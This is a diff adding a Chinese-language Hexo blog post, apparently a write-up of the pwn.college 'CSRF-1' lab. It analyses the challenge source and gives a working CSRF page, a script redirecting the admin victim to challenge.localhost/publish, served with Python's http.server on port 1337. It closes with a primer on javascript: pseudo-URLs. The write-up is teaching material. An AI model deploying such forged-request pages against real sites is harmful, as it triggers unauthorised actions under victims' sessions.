@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"0x4a-210.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="题目简介XSS注入JavaScript以导致受害者发起HTTP请求。 但是如果没有XSS怎么办？ 答案是直接“注入”HTTP请求。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF-1">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-1/index.html">
+<meta property="og:site_name" content="0x4A">
+<meta property="og:description" content="题目简介XSS注入JavaScript以导致受害者发起HTTP请求。 但是如果没有XSS怎么办？ 答案是直接“注入”HTTP请求。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Web/CSRF-1/CSRF-1.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Web/CSRF-1/window-location-href1.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Web/CSRF-1/window-location-href2.png">
+<meta property="article:published_time" content="2025-07-18T00:50:38.000Z">
+<meta property="article:modified_time" content="2025-07-19T04:55:27.381Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Web/CSRF-1/CSRF-1.png">
+
+<link rel="canonical" href="http://0x4a-210.github.io/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>CSRF-1 | 0x4A</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">0x4A</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://0x4a-210.github.io/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0x4A">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CSRF-1
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2025-07-18 08:50:38" itemprop="dateCreated datePublished" datetime="2025-07-18T08:50:38+08:00">2025-07-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-07-19 12:55:27" itemprop="dateModified" datetime="2025-07-19T12:55:27+08:00">2025-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-college/" itemprop="url" rel="index"><span itemprop="name">pwn.college</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-college/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">题解</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-college/%E9%A2%98%E8%A7%A3/intro/" itemprop="url" rel="index"><span itemprop="name">intro</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-college/%E9%A2%98%E8%A7%A3/intro/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>XSS注入JavaScript以导致受害者发起HTTP请求。 但是如果没有XSS怎么办？ 答案是直接“注入”HTTP请求。<br></p>
+<span id="more"></span>
+<p>web设计的目的是使许多不同的网站相互连接。 网站可以嵌入来自其他网站的图像，链接到其他网站，甚至重定向到其他网站。 所有这些灵活性意味着一些严重的安全风险，而且几乎没有任何措施可以防止恶意网站直接导致受害者访问者发出潜在的敏感请求，例如（在我们的例子中）将 GET 请求发送给 <a target="_blank" rel="noopener" href="http://challenge.localhost/publish">http://challenge.localhost/publish</a> ！<br></p>
+<p>这种类型的跨站点请求伪造被称为跨站请求伪造（Cross Site Request Forgery，简称CSRF）。<br></p>
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先分析源码，这题其实存在XSS漏洞，但是admin不会访问&#x2F;challenge.localhost，因此没办法通过把js代码写到首页去骗admin重定向到publish路由<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_get</span>():</span><br><span class="line">    page = <span class="string">&quot;&lt;html&gt;&lt;body&gt;\nWelcome to pwnpost, now XSS-free (for admin, at least)!&lt;hr&gt;\n&quot;</span></span><br><span class="line">    username = flask.session.get(<span class="string">&quot;username&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        page += <span class="string">&quot;&quot;&quot;&lt;b&gt;To prevent XSS, the admin does not view messages!&lt;/b&gt;&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到存在if username&#x3D;&#x3D;’admin’的额外校验，根据提示应该用CSRF；<br><br>接下来看一下victim源码：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">challenge_url = <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Visiting <span class="subst">&#123;challenge_url&#125;</span>&quot;</span>)</span><br><span class="line">browser.get(challenge_url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Logging in as admin...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Visiting the attacker&#x27;s website (http://hacker.localhost:1337/)...&quot;</span>)</span><br><span class="line">browser.get(<span class="string">&quot;http://hacker.localhost:1337/&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<p>分析一下，主要分两个部分，第一个是请求challenge.localhost，并且以admin登录，接下来注意到第二部分会访问本地的1337端口；<br><br>因此只要我们在1337开一个web服务，把admin重定向到&#x2F;publish路由就可以了；<br><br>因此存在CSRF漏洞，可以从我们的“钓鱼网站”伪造admin在请求<br></p>
+<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>综上，利用思路就是在1337开一个服务，等victim访问我们，然后再以guest身份登录challenge.localhost即可看到flag<br>开启服务有很多方法，题目里就提供了两个，一个最基础的nc，前面几题都用过，不再记录<br><br>另一个是python的http.server模块，个人感觉python的比nc方便，只要写一个简单的index.html就行；<br><br>因此写出如下的index.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://challenge.localhost/publish&quot;</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>综上，完整流程是：<br><br>首先启动&#x2F;challenge&#x2F;server<br><br>之后cd到保存有index.html的目录中并运行以下命令：<br></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 1337</span><br></pre></td></tr></table></figure>
+<p>之后再运行&#x2F;challenge&#x2F;victim，最后刷新浏览器就可以了，也是成功拿到了flag<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/CSRF-1.png"></p>
+<h2 id="一点基础知识补充"><a href="#一点基础知识补充" class="headerlink" title="一点基础知识补充"></a>一点基础知识补充</h2><p>回看这个Wp，感觉缺了些基础知识的讲解，简单讲一下index.html怎么写出来的<br><br>其实主要是html里的这一句</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://challenge.localhost/publish&quot;</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果是完全零基础，大概率会有疑问window.location.href是个什么东西（记得pwn.college的前面题目都没讲过这个东西），这里浅浅演示一下，深入的还得自己查，直接看下面这两张图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/window-location-href1.png"><br>首先上面第一张图，看到我在浏览器的url里输入了这么个东西：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(window.location.href)</span><br></pre></td></tr></table></figure>
+<p>拆解一下，alert没什么好说的，alert的参数就是window这一大串，这个url意思就是执行冒号后面的javascript代码，当点击回车的时候，由于当前位于b站的首页，浏览器就会显示b站的域名,如下图<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CSRF-1/window-location-href2.png"><br>这样应该能感受到，window这一串其实可以理解为网页域名，这道题里我们通过对它赋值，起到了重定向的作用<br><br>至于javascript:是什么，其实就是一个伪协议头，可以把它理解为http:&#x2F;&#x2F;这样的东西，搜一下完整的URL组成可以知道这些都是协议头，简单记忆就是不带&#x2F;&#x2F;的就是伪协议，反之就是我们常见的协议头<br><br>伪协议还有很多，像mailto:，这个协议后面跟邮箱，浏览器就会唤起电脑里默认的邮件应用程序，还有tel:，跟个号码，打电话用的<br><br>上述基础知识只是一个简单的补充，以后碰到具体题目再做记录</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/SQLi-5/" rel="prev" title="SQLi-5">
+      <i class="fa fa-chevron-left"></i> SQLi-5
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/07/18/pwn.college/Intro-to-Cybersecurity/Web/CSRF-3/" rel="next" title="CSRF-3">
+      CSRF-3 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">题目简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞点分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞点利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E7%82%B9%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="nav-number">3.1.</span> <span class="nav-text">一点基础知识补充</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
